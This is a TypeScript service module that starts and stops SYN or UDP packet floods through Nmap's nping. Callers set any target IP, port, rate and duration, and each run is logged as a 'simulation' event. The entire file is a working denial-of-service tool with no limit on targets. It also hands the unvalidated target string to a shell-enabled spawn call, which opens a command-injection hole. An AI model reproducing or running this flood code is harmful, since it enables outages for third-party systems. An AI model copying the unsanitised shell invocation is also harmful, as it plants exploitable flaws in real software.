// services/ddosService.ts
import { spawn, ChildProcessWithoutNullStreams } from 'child_process';
import { insertEvent } from '../models/eventModel';

let ddosProcess: ChildProcessWithoutNullStreams | null = null;

interface DDoSAttackParams {
    targetIP: string;
    port: number;
    method: 'TCP' | 'UDP' | 'HTTP';
    threads: number;
    duration: number; // in seconds
}

export async function startDDoSAttack(params: DDoSAttackParams): Promise<boolean> {
    if (ddosProcess) stopDDoSAttack();
    await insertEvent({ type: 'ddos_simulation', source_ip: 'localhost', dest_ip: params.targetIP, severity: 'medium' });

    // windows-compatible nping path (ensure nping is installed via nmap)
    const npingPath = '"C:\\Program Files (x86)\\Nmap\\nping.exe"';
    const args: string[] = [];

    // choose protocol
    if (params.method === 'UDP') {
        args.push('--udp');
    } else {
        args.push('--tcp', '--flags', 'SYN');
    }

    // port, rate, and target
    args.push('-p', String(params.port));
    args.push('--rate', String(params.threads));
    args.push(params.targetIP);

    // spawn with shell to handle spaces in path
    const proc = spawn(npingPath, args, { shell: true });
    ddosProcess = proc;

    proc.stdout.on('data', (data: Buffer) => {
        console.log(data.toString());
    });

    proc.stderr.on('data', (data: Buffer) => {
        console.error(data.toString());
    });

    // terminate flood after duration expires
    setTimeout(() => {
        stopDDoSAttack();
    }, params.duration * 1000);

    return true;
}

export function stopDDoSAttack(): void {
    if (ddosProcess) {
        ddosProcess.kill();
        ddosProcess = null;
        console.log('DDoS simulation stopped');
    }
}

export function getDDoSStatus(): { active: boolean; target?: string } {
    return {
        active: ddosProcess !== null,
        target: ddosProcess ? ddosProcess.spawnargs.join(' ') : undefined
    };
}
